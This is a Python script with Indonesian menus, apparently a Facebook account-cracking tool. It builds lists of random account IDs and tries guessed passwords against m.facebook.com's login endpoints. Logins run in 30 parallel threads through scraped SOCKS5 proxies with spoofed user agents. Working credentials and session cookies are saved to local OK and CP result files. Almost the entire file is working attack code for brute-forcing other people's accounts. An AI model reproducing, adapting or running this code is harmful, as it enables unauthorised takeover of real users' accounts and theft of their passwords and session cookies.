#!/usr/bin/python3
# -*- coding: utf-8 -*-


import os
try:
    import requests
except ImportError:
    os.system('pip install requests' if os.name == 'nt' else 'pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures' if os.name == 'nt' else 'pip install futures')
try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install bs4' if os.name == 'nt' else 'pip install bs4')
try:
    import rich
except ImportError:
    os.system('pip install rich' if os.name == 'nt' else 'pip2 install rich')

import requests, re, os, random, sys,bs4,time,json
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor as upil
from datetime import date
from datetime import datetime
from urllib.parse import quote
from platform import platform
from urllib.error import URLError
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
from data import dump as dup
from data import cokz as sx
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
 	if n < 0 or n > 12:
 		exit()
 	nTemp = n - 1
except ValueError:
 	exit()
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
warna = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' #
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
tanggal = '%s-%s-%s'%(ha,op,ta)
tanggal.split('/')
ses=requests.session()
loop = 0
id = []
ok = []
cp = []

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mCluuuut')
prox=open('.prox.txt','r').read().splitlines()


def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	menu()

def real_time():
	from time import time
	return str(time()).split('.')[0]

def banner():
	print('''.oPYo.                     8 \n8    8                     8 \n8      oPYo. .oPYo. .oPYo. 8  .o \n8      8  `' .oooo8 8    ' 8oP' \n8      8     8    8 8    . 8 `b. \n`YooP' 8     `YooP8 `YooP' 8  `o. \n:......:..:::::.....::.....:..::......\n: ##### :   \033[1;93mUPIL FACEBOOK\033[0m    : ##### :\n::::::::::::::::::::::::::::::::::::::''') 

def hapus_log():
	try:os.sytem('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
	except:pass

def menu():
	os.system('clear');banner()
	try:
		tokenz = open(".token.txt", "r").read()
		cookie = {'cookie': open(".cokie.txt", "r").read()}
	except FileNotFoundError:
		time.sleep(2);sx.Login()
	prints(f"\n * {biru_m}01{hapus}. CRACK DARI PUBLIK \n * {biru_m}02{hapus}. CLONING RANDOM ACCOUNT OLD \n * {biru_m}03{hapus}. CEK HASIL CRACK & CLONING \n * {biru_m}04{hapus}. ATUR USER AGENT \n * {biru_m}00{hapus}. Keluar {merah}exit program{hapus}")
	pil = input(f"\n *{N} menu : ")
	if pil in[""," "]:
		print("");prints(Panel("😡[bold red] jangan kosong "));time.sleep(2);menu()
	elif pil in["1","01"]:
		dup.Dump().dump_prem(cookie, tokenz)
	elif pil in["2","02"]:
		jadul()
	elif pil in["3","03"]:
		cek_hasil()
	elif pil in["4","04"]:
		set_ua()
	elif pil in['0','00']:
		titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
		for x in titik:
			sys.stdout.write(f"\r  [{M}Ã—{N}] menghapus cookie {N}{x}{N}");sys.stdout.flush()
			time.sleep(1)
			hapus_log()
		print("");prints(Panel(f"[{hijau}âœ“{hapus}] berhasil menghapus cookie"));exit()
	else:
            print("");prints(Panel(f"ðŸ˜¡ memu [bold red]{pil}[/] tidak ada, cek menu nya!"));time.sleep(2);menu()

def cek_hasil():
	print(f"\n * 1 hasil crack OK\n * 2 hasil crack CP")
	ask = input("\n * pilih : ")
	if ask in ["1"]:
		dirs = os.listdir("OK")
		print(" * list nama file tersimpan di folder OK\n")
		for file in dirs:print(" * "+file)
		try:
			file = input("\n * pilih nama file : ")
			if file == "":menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:exit(" * file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
		print(" * [#] -------------------------------------")
		print(" * hasil : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		print("\033[0m * [#] -------------------------------------")
		print(" * copy dan di simpan hasilnya")
		input(" * kembali untuk enter : ")
		menu()
	elif ask in ["2"]:
		dirs = os.listdir("CP")
		print(" * list nama file tersimpan di folder CP\n")
		for file in dirs:print(" * "+file)
		try:
			file = input("\n * pilih nama file : ")
			if file == "":menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:exit(" * file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
		print(" * [#] -------------------------------------")
		print(" * hasil : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		print("\033[0m * [#] ------------------------------------")
		print(" * copy dan di simpan hasilnya\n")
		input(" * kembali di enter : ")
		menu()
	else:menu()


def jadul():
	try:
		os.mkdir('sempak')
	except:pass
	try:
		os.system('rm -rf sempak/id.txt')
		print(f"\n * contoh target : 21,250 dll")
		ay = input(' * angka target  : ').split(',')
		p = open('sempak/id.txt', 'a')
		try:
			for ae in ay:
				for k in range(4999):
					us = random.randint(1111, 9999)
					aa = ae.lower()
					p.write("\r%s%s"%(aa,us))
					sys.stdout.flush()
			p.close()
		except (KeyError,IOError):
			input(' * [ \033[1;31menter untuk kembali ke target\033[0m ] ')
			jadul()
	except (KeyError, IOError):
		exit(f" * anda error, ngewe yuk ")
	old()


def set_ua():
	os.system('rm -rf uaku.txt')
	print("\n * 01. Gunakan user agent hp sendiri \n * 02. Gunakan user agent bawaan \n * 03. user agent random \n * 04. user agent fb lite \n * 00. Kembali ")
	pil = input(f" \n* pilih : ")
	if pil in["1","01"]:
           try:os.sytem("rm -rf uaku.txt")
           except:pass
           ua = input(" * masukan user agent: ")
           open("uaku.txt", "w").write(ua)
           print("berhasil mengganti user agent");input(f" [ {O}Kembali{N} ] ");jadul()
	elif pil in["2", "02"]:
            try:os.system("rm -rf uaku.txt")
            except:pass
            ee = requests.get('https://yayanxd.my.id/server/ua.txt').text
            open("uaku.txt", "w").write(ee)
            print("berhasil mengganti user agent");input(f" [ {O}Kembali{N} ] ");menu()
	elif pil in["3", "03"]:
		try:os.system("uaku.txt")
		except:pass
		ua_random()
	elif pil in['4','04']:
		uas=[]
		a = requests.get("https://github.com/el-fir4/el/blob/main/ua.txt").text
		ua = open('uaku.txt','w')
		xx=re.findall('line">(.*?)<', str(a))
		for x in xx:
			ua.write(x+"\n")
		ua=open("uaku.txt", "r").read().splitlines()
		for i in ua:
			uas.append(i)
		print(f" \n * berhasil menyimpan ua fb lite")
	elif pil in["0", "00"]:
		set_ua()
	else:
            print(f" * input yang benar");set_ua()

def ua_random():
        print(f"\n* \033[1;93mSILAHKAN PILIH USER AGENT YANG MENURUT ANDA COCOK \033[1;96m \n* 01. Samsung    * 05. Vivo       * 09. Huawei \n* 02. Nokia      * 06. Iphone     * 10. Windows \n* 03. Xiomi      * 07. Asus       * 11. Chrome \n* 04. Oppo       * 08. lenovo     * 12. Facebook\n")
        cxx = input(f"{N}\n* menu ")
        if cxx in["", " "]:
            print(f" *  jangan kosong");ua_random()
        elif cxx in["1", "01"]:
            type = 'software_name/samsung-browser'
        elif cxx in["2", "02"]:
            type = 'software_name/nokia-browser'
        elif cxx in["3", "03"]:
            type = 'operating_platform_string/xiaomi-mi-a1'
        elif cxx in["4", "04"]:
            type = 'operating_platform_string/oppo-f1s-a1601'
        elif cxx in["5", "05"]:
            type = 'operating_platform_string/vivo'
        elif cxx in["6", "06"]:
            type = 'operating_platform_string/apple'
        elif cxx in["7", "07"]:
            type = 'operating_platform_string/asus'
        elif cxx in["8", "08"]:
            type = 'operating_platform_string/lenovo'
        elif cxx in["9", "09"]:
            type = 'operating_platform_string/huawei'
        elif cxx in["10"]:
            type = 'operating_system_name/windows'
        elif cxx in["11"]:
            type = 'operating_system_name/chrome-os'
        elif cxx in["12"]:
            type = 'facebook-lite'
        else:
            print(f" *  input yang bener");ua_random()
        url = "https://developers.whatismybrowser.com/useragents/explore/"+ type
        with requests.Session() as xyz:
            req = xyz.get(url)
            pra = parser(req.content,'html.parser')
            li = re.findall('<td><a class=\".*?\" href=\".*?\">(.*?)</a></td>',str(pra))
            for y in li:
                try:
                    ue=[]
                    asd = 0
                    data_ua={}
                    asd += 1
                    x = f"{y}"
                    pu = str(asd)
                    data_ua.update({pu:x.replace('[#AAAAAA]','')})
                    open('uaku.txt','a').write(x+'\n')
                except KeyboardInterrupt:
                    break
        menu()

def old():
	try:
		idk = ('sempak/id.txt')
		for line in open(idk, 'r').readlines():
			id.append(line.strip())
	except:
		prints(' * File [\033[1;31m %s \033[0m] Tidak ada '%(idk));time.sleep(3);old()
	print(" * total id      : %s"%(len(id)))
	pwx=input(" * tebak sandi   : ")
	prints(f'\n * 01. FACEBOOK LITE \n * 02. ALL BROWSER \n * 03. CHROME LINUX')
	er=input(f'\n * pilih : ')
	if er in['']:
		print(f' * pilih salah satu lah');time.sleep(2);old()
	if er in ['1','01']:
		print('\n * OK tersimpan di file : %s'%(tanggal))
		print(' * CP tersimpan di file : %s\n'%(tanggal))
		with upil(max_workers=30) as laura:
			for ids in id:
				try:
					uid=ids.split(' ')[0]
					laura.submit(lite, uid, pwx.split(','))
				except requests.exceptions.ConnectionError:pass
				except Exception as e:os.sys.exit(e)
				except:pass
		exit("\n * crack selesei...\n")

	elif er in['2','02']:
		print('\n * OK tersimpan di file : %s'%(tanggal))
		print(' * CP tersimpan di file : %s\n'%(tanggal))
		with upil(max_workers=30) as laura:
			for ids in id:
				try:
					uid=ids.split(' ')[0]
					laura.submit(method, uid, pwx.split(','))
				except requests.exceptions.ConnectionError:pass
				except Exception as e:os.sys.exit(e)
				except:pass
		exit("\n * crack selesei...\n")
	elif er in['3','03']:
		print('\n * OK tersimpan di file : %s'%(tanggal))
		print(' * CP tersimpan di file : %s\n'%(tanggal))
		with upil(max_workers=30) as laura:
			for ids in id:
				try:
					uid=ids.split(' ')[0]
					laura.submit(html, uid, pwx.split(','))
				except requests.exceptions.ConnectionError:pass
				except Exception as e:os.sys.exit(e)
				except:pass
		exit("\n * crack selesei...\n")
	else:
		print(' * pilih yg bener');time.sleep(2);old()

def method(user,pwx):
	global ok,cp,loop
	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
	rr = open("uaku.txt", "r").read().splitlines()
	uaa=random.choice(rr)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ses=requests.session()
	for pw in pwx:
		head1 = {
			'Host':'m.facebook.com',
			'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
			'user-agent':uaa,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		try:
				r=ses.get(f"https://m.facebook.com/", headers=head1).text.encode('utf-8')
		except:
				r=ses.get(f"https://m.facebook.com/", headers=head1).text
		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
		head2={
			'Host':'m.facebook.com',
			'user-agent':uaa,
			'content-type':'application/x-www-form-urlencoded',
			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			'accept':'*/*',
			'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
			'referer':'https://m.facebook.com/',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date,headers=head2, proxies=proxs, allow_redirects=False)
		if "c_user" in ses.cookies.get_dict():
			cok = ses.cookies.get_dict()
			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
			print("\r *\033[1;34m OK ã€‹%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
			ok.append("%s|%s"%(user, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict():
			print("\r * \033[1;93mCP ã€‹ %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
			cp.append("%s|%s"%(user, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		else:
			continue

	loop+=1


def html(user,pwx):
	global ok,cp,loop
	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
	rr = open("uaku.txt", "r").read().splitlines()
	uaa=random.choice(rr)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ses=requests.session()
	for pw in pwx:
		head1 = {
			'Host':'m.facebook.com',
			'upgrade-insecure-requests':'1',
			'user-agent':uaa,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with':'web.dassem.websiteanalyzer',
			'sec-fetch-site':'none',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		}
		try:
				r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text.encode('utf-8')
		except:
				r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text
		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
		head2={
			'Host':'m.facebook.com',
			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			'user-agent':uaa,
			'content-type':'application/x-www-form-urlencoded',
			'accept':'*/*',
			'origin':'https://m.facebook.com',
			'x-requested-with':'web.dassem.websiteanalyzer',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
			'referer':'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'accept':'*/*',
			'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
			'referer':'https://m.facebook.com/',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date,headers=head2, proxies=proxs, allow_redirects=False)
		if "c_user" in ses.cookies.get_dict():
			cok = ses.cookies.get_dict()
			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
			print("\r *\033[1;34m OK ã€‹%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
			ok.append("%s|%s"%(user, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict():
			print("\r * \033[1;93mCP ã€‹ %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
			cp.append("%s|%s"%(user, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		else:
			continue

	loop+=1

def lite(user,pwx):
	global ok,cp,loop
	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
	rr = open("uaku.txt", "r").read().splitlines()
	uaa=random.choice(rr)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ses=requests.session()
	for pw in pwx:
		head1 = {
			'Host':'m.facebook.com',
			'upgrade-insecure-requests':'1',
			'user-agent':'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/315.0.0.18.109;FBDM/DisplayMetrics{density=1.5, width=540, height=960, scaledDensity=1.5, xdpi=221.225, ydpi=221.67201};]',
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with':'com.facebook.lite',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'referer':'https://m.facebook.com/palanda.elvantan?ref_component=mbasic_home_bookmark&ref_page=%2Fwap%2Fhome.php&refid=7',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text
		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw, 'login':'Masuk','bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"', str(r)).group(1)}
		head2={
			'Host':'m.facebook.com',
			'content-length':'186',
			'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
			'origin':'https://m.facebook.com',
			'content-type':'application/x-www-form-urlencoded',
			'user-agent':'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/315.0.0.18.109;FBDM/DisplayMetrics{density=1.5, width=540, height=960, scaledDensity=1.5, xdpi=221.225, ydpi=221.67201};]',
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with':'com.facebook.lite',
			'sec-fetch-site':'same-origin',
			'sec-fetch-mode':'navigate',
			'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
			'referer':'https://m.facebook.com/?stype=lo&jlou=AffokRwWTYW2rV-o-d_iItugkkR9Vd9bJ0BeUSLjOqT3Y1b6-Jend_QNeClPSJRp19FcwGEuzTU97W8ObSVKPEWMo9FuIs4-i3RVtRZR2AUzTA&smuh=5796&lh=Ac_dnvSUPXoDi71mlTM&refid=17&_rdr',
			'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		p=ses.post(f"https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",data=date,headers=head2, proxies=proxs, allow_redirects=False)
		if "c_user" in ses.cookies.get_dict():
			cok = ses.cookies.get_dict()
			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
			print("\r *\033[1;34m OK Ã£â‚¬â€¹%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
			ok.append("%s|%s"%(user, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict():
			print("\r * \033[1;93mCP Ã£â‚¬â€¹ %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
			cp.append("%s|%s"%(user, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
			break
		else:
			continue

	loop+=1


if __name__=='__main__':
	from data import tess
	tess.set_ua()
